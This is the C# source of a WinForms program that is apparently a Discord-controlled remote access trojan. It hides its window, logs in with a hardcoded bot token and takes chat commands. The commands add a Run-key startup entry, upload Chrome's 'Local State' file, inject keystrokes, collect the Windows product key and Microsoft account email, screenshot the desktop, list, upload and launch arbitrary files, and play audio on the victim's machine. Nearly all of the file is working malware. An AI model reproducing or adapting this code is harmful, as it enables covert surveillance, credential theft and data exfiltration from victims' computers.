using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord;
using Discord.WebSocket;
using System.Windows.Input;
using System.Media;
using Woof.SystemEx;

#warning The Commands Are Really Difficult To Understand, I Don't Put Any Effort Into These Projects :3

namespace uwu_poggy_woggy_boy
{
    public partial class winforms_are_shit : Form
    {
        public winforms_are_shit()
        {
            InitializeComponent();
            Main();
            this.Hide();
        }

        private DiscordSocketClient _client;
        public async void Main()
        {

            var config = new DiscordSocketConfig()
            {
                GatewayIntents = GatewayIntents.All
            };

            _client = new DiscordSocketClient(config);
            _client.MessageReceived += Commands;

            string token = "MTAyMjUzODg2Njc2ODQ5NDYxMg.Goo_2K.wB_QwyN7iraf-CPvJqXAfanig3PmLWUHwfNRsw";

            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            await Task.Delay(-1);
        }

        public Task Commands(SocketMessage message)
        {

            if (message.Content.StartsWith("+startup true"))
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("UwUOwOHehe", $@"{System.Windows.Forms.Application.ExecutablePath}");
            }

            if (message.Content.StartsWith("+startup false"))
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.DeleteValue("UwUOwOHehe", false);
            }

            //gets the local state file from chrome

            if (message.Content == "+get chrome locals")
            {
                message.Channel.SendMessageAsync("```" + Key.Enter + File.ReadAllText("C:/Users/" + Environment.UserName + "/Appdata/Local/Google/Chrome/User Data/Local State" + "```"));
                message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/Appdata/Local/Google/Chrome/User Data/Local State");
            }

            //make the host type anything u want :)

            if (message.Content.StartsWith("+type "))
            {
                var arg = message.Content.Split(new[] { "+type " }, StringSplitOptions.None)[1];
                SendKeys.SendWait(arg);
            }

            //gets the pc info

            if (message.Content == "+get info")
            {
                var owo = SystemInformation.BootMode;
                var hehe = SystemInformation.Network;
                var productkey = SysInfo.WindowsProductKey;
                var idk = SysInfo.GetMicrosoftAccount(Environment.UserName);
                var kk = SysInfo.SystemDiskSerialNumber;
                string emailname = Path.ChangeExtension(idk, null);
                var totalram = SysInfo.SystemMemoryTotal;
                var freeram = SysInfo.SystemMemoryFree;

                var freeramnew = Convert.ToString(freeram);

                string freeramnewnew = Path.ChangeExtension(freeramnew, null);

                var totalramnew = Convert.ToString(totalram);

                string totalramnewnew = Path.ChangeExtension(totalramnew, null);


                EmbedBuilder uwu = new EmbedBuilder();
                uwu.AddField("MachineName", Environment.MachineName, true);
                uwu.AddField("OSVersion", Environment.OSVersion, true);
                uwu.AddField("HWID", kk, true);
                uwu.AddField("Product Key", productkey, true);
                uwu.AddField("UserName", Environment.UserName, true);
                uwu.AddField("BootMode", owo, true);
                uwu.AddField("Network Presence", hehe, true);
                uwu.AddField("Microsoft Account Email", idk, true);
                uwu.AddField("Free RAM", freeramnewnew + " GB", true);
                uwu.AddField("Total RAM", totalramnewnew + " GB", true);
                message.Channel.SendMessageAsync(null, false, uwu.Build());
            }

            //sends the desktop screenshots to discord

            if (message.Content == "+get desktop")
            {
                if (Screen.AllScreens.Length >= 1)
                {
                    Desktop();
                    Desktop1();
                    var height = SystemInformation.VirtualScreen.Height;
                    var width = SystemInformation.VirtualScreen.Width;

                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Screen Resolution :)");
                    uwu.WithFooter("Screen Width and Screen Height are the added up depending on the monitor orientation");
                    uwu.AddField("Screen Height (Both Screens)", height, true);
                    uwu.AddField("Screen Width (Both Screens)", width, true);

                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                    message.Channel.SendFileAsync("uwu.png");
                    message.Channel.SendFileAsync("uwu2.png");
                }
                else if (Screen.AllScreens.Length == 0)
                {
                    Desktop();
                    message.Channel.SendFileAsync("uwu.png");
                }
            }

            //plays audio on the host device

            if (message.Content.Contains("+audio "))
            {
                var arg = message.Content.Split(new[] { "+audio " }, StringSplitOptions.None)[1];
                try
                {
                    SoundPlayer player = new SoundPlayer(arg);
                    player.LoadAsync();
                    player.Play();
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Playing Audio :D");
                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
                    uwu.WithDescription("");
                    uwu.AddField("Audio Link", arg, true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                }
                catch (Exception)
                {
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Error Occured D:");
                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
                    uwu.WithDescription("");
                    uwu.AddField("Reason", "Invalid audio format", true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                    //message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
                }
            }

            //plays looped audio on the host device

            if (message.Content.Contains("+audioloop "))
            {
                var arg = message.Content.Split(new[] { "+audioloop " }, StringSplitOptions.None)[1];
                try
                {
                    SoundPlayer player = new SoundPlayer(arg);
                    player.LoadAsync();
                    player.PlayLooping();
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Playing Audio :D");
                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
                    uwu.WithDescription("");
                    uwu.AddField("Audio Link", arg, true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                }
                catch (Exception)
                {
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Error Occured D:");
                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
                    uwu.WithDescription("");
                    uwu.AddField("Reason", "Invalid audio format", true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                    //message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
                }
            }

            if (message.Content == "+audiostop")
            {
                try
                {
                    SoundPlayer player = new SoundPlayer();
                    player.Stop();
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Stopping Audio :D");
                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
                    uwu.WithDescription("");
                    uwu.AddField("Audio Stopped", "meow", true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                }
                catch
                {
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Error Occured D:");
                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
                    uwu.WithDescription("");
                    uwu.AddField("Reason", "No music playing", true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                }
            }

            //gets the file paths in a directory

            if (message.Content.StartsWith("+get files"))
            {
                var arg = message.Content.Split(new[] { "+get files" }, StringSplitOptions.None)[1];
                try
                {
                    string[] filePaths = Directory.GetFiles($@"{arg}", "*", SearchOption.AllDirectories);
                    string allDir = "";
                    for (int i = 0; i < filePaths.Length; i++)
                    {
                        allDir = string.Concat(allDir, "\n" + filePaths[i]);
                    }
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("All files in " + arg + " :)");
                    uwu.WithFooter("uwu");
                    uwu.WithDescription(allDir);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                    //message.Channel.SendMessageAsync(allDir);
                }
                catch
                {
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Error Occured D:");
                    uwu.WithFooter("uwu");
                    uwu.WithDescription("");
                    uwu.AddField("Reason", "Invalid Directory || Invalid Permissions", true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                    //message.Channel.SendMessageAsync("Directory not valid.");
                }
            }

            //gets a file from a directory and uploads it

            if (message.Content.StartsWith("+get file "))
            {
                var arg = message.Content.Split(new[] { "+get file " }, StringSplitOptions.None)[1];
                try
                {
                    message.Channel.SendFileAsync(arg);
                }
                catch
                {
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Error Occured D:");
                    uwu.WithFooter("uwu");
                    uwu.WithDescription("");
                    uwu.AddField("Reason", "Invalid Directory || Invalid Permissions", true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                    //message.Channel.SendMessageAsync("Directory not found.");
                }
            }

            //opens a file :|

            if (message.Content.StartsWith("+open file "))
            {
                var arg = message.Content.Split(new[] { "+open file " }, StringSplitOptions.None)[1];
                try
                {
                    Process.Start(arg);
                }
                catch
                {
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Error Occured D:");
                    uwu.WithFooter("uwu");
                    uwu.WithDescription("");
                    uwu.AddField("Reason", "Invalid Directory || Invalid Permissions", true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                    //message.Channel.SendMessageAsync("Directory not found.");
                }
            }

            //opens a website :|

            if (message.Content.StartsWith("+open web "))
            {
                var arg = message.Content.Split(new[] { "+open web " }, StringSplitOptions.None)[1];
                try
                {
                    if (arg.Contains("https://"))
                    {
                        Process.Start(arg);
                        message.Channel.SendMessageAsync(arg + " has been opened");
                    }
                    else if (arg.Contains("http://"))
                    {
                        Process.Start(arg);
                        message.Channel.SendMessageAsync(arg + " has been opened");
                    }
                    else
                    {
                        Process.Start(@"https://" + arg);
                        message.Channel.SendMessageAsync(arg + " has been opened");
                    }
                }
                catch
                {
                    EmbedBuilder uwu = new EmbedBuilder();
                    uwu.WithTitle("Error Occured D:");
                    uwu.WithFooter("uwu");
                    uwu.WithDescription("");
                    uwu.AddField("Reason", "Invalid URL", true);
                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                    //message.Channel.SendMessageAsync("Didn't work");
                }
            }

            //sends a messagebox to the hosts pc

            if (message.Content.StartsWith("+messagebox"))
            {
                var arg = message.Content.Split(new[] { "+messagebox" }, StringSplitOptions.None)[1];
                MessageBox.Show(new Form { TopMost = true }, arg);
            }

            return Task.CompletedTask;
        }

        //gets the first desktop screen

        void Desktop()
        {
            Rectangle size = Screen.GetBounds(Point.Empty);
            Bitmap cBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
            Rectangle cRectangle = Screen.AllScreens[0].Bounds;
            Graphics cGraphics = Graphics.FromImage(cBitmap);
            cGraphics.CopyFromScreen(cRectangle.Left, cRectangle.Top, 0, 0, cRectangle.Size);
            cBitmap.Save(@"uwu.png", System.Drawing.Imaging.ImageFormat.Jpeg);
        }

        //gets the second desktop screen

        void Desktop1()
        {
            Rectangle size = Screen.GetBounds(Point.Empty);
            Bitmap cBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
            Rectangle cRectangle = Screen.AllScreens[1].Bounds;
            Graphics cGraphics = Graphics.FromImage(cBitmap);
            cGraphics.CopyFromScreen(cRectangle.Left, cRectangle.Top, 0, 0, cRectangle.Size);
            cBitmap.Save(@"uwu2.png", System.Drawing.Imaging.ImageFormat.Jpeg);
        }
    }
}